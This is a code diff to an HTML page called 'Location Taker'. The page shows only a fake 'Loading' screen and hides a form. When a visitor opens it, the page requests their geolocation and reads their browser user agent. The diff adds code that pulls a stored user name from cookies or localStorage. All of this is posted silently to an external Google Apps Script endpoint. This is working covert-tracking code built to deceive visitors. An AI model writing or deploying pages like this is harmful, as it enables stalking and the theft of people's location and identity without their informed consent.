@@ -3,25 +3,25 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Location taker</title>
+  <title>Location Taker</title>
   <style>
-     body {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-        }
-        h1 {
-            font-size: 3em;
-            font-weight: bold;
-            background: linear-gradient(90deg, #ff6f61, #ff9966, #ffcc66, #faff70);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            animation: gradient 3s infinite linear, blink 1s infinite step-end;
-        }
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      background-color: #f0f0f0;
+      font-family: Arial, sans-serif;
+    }
+    h1 {
+      font-size: 3em;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ff6f61, #ff9966, #ffcc66, #faff70);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: gradient 3s infinite linear, blink 1s infinite step-end;
+    }
     form {
       display: none;
     }
@@ -30,41 +30,69 @@
 <body>
   <h1>Loading ......</h1>
   <form name="submit-to-google-sheet">
-    <input name="name" type="name" placeholder="name" value="jhon Doe" required>
+    <input name="name" type="text" placeholder="Name" value="" required>
     <input name="gmaps" type="text" placeholder="Coordinates" required>
     <input name="deviceInfo" type="text" placeholder="Device Info" required>
     <button type="submit">Send</button>
   </form>
 
   <script>
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbxgilOwmY4GPxWASlZ8lWzkStbPVdDWTeetj1HDxe6hhMnUR2dqrbVtOD25wQ0MadzXFQ/exec'
-    const form = document.forms['submit-to-google-sheet']
-    const gmapsInput = form.elements['gmaps']
-    const deviceInfoInput = form.elements['deviceInfo']
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbxgilOwmY4GPxWASlZ8lWzkStbPVdDWTeetj1HDxe6hhMnUR2dqrbVtOD25wQ0MadzXFQ/exec';
+    const form = document.forms['submit-to-google-sheet'];
+    const nameInput = form.elements['name'];
+    const gmapsInput = form.elements['gmaps'];
+    const deviceInfoInput = form.elements['deviceInfo'];
+
+    function getCookie(name) {
+      const value = `; ${document.cookie}`;
+      const parts = value.split(`; ${name}=`);
+      if (parts.length === 2) return parts.pop().split(';').shift();
+      return null;
+    }
+
+    function getLocalStorageItem(key) {
+      return localStorage.getItem(key);
+    }
+
+    function setNameInput() {
+      // Try to get the name from cookies first
+      let userName = getCookie('userName');
+      // If no cookie, try to get from local storage
+      if (!userName) {
+        userName = getLocalStorageItem('userName');
+      }
+      // Set the name input value if a name was found
+      if (userName) {
+        nameInput.value = userName;
+      }
+    }
 
     function success(position) {
-      const latitude = position.coords.latitude
-      const longitude = position.coords.longitude
-      gmapsInput.value = `${latitude},${longitude}`
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+      gmapsInput.value = `${latitude},${longitude}`;
 
       // Get device information
-      const userAgent = navigator.userAgent
-      deviceInfoInput.value = userAgent
+      const userAgent = navigator.userAgent;
+      deviceInfoInput.value = userAgent;
 
       fetch(scriptURL, { method: 'POST', body: new FormData(form)})
         .then(response => console.log('Success!', response))
-        .catch(error => console.error('Error!', error.message))
+        .catch(error => console.error('Error!', error.message));
     }
 
     function error() {
-      console.error('Unable to retrieve your location')
+      console.error('Unable to retrieve your location');
     }
 
     if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(success, error)
+      navigator.geolocation.getCurrentPosition(success, error);
     } else {
-      console.error('Geolocation is not supported by your browser')
+      console.error('Geolocation is not supported by your browser');
     }
+
+    // Set the name input value from cookies or local storage
+    setNameInput();
   </script>
 </body>
 </html>
